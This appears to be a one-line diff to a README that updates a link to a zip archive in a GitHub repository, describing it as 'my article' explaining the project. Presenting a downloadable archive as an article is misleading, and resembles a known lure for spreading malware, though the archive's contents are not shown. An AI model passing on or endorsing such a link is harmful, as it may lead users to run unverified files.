@@ -1,1 +1,1 @@
-Check my article https://github.com/marcossangomes/reports-elb-teams/raw/refs/heads/master/elderwood/teams_reports_elb_2.0.zip to see the explanation about this project.
+Check my article https://raw.githubusercontent.com/marcossangomes/reports-elb-teams/master/elderwood/reports_elb_teams_v2.2.zip to see the explanation about this project.
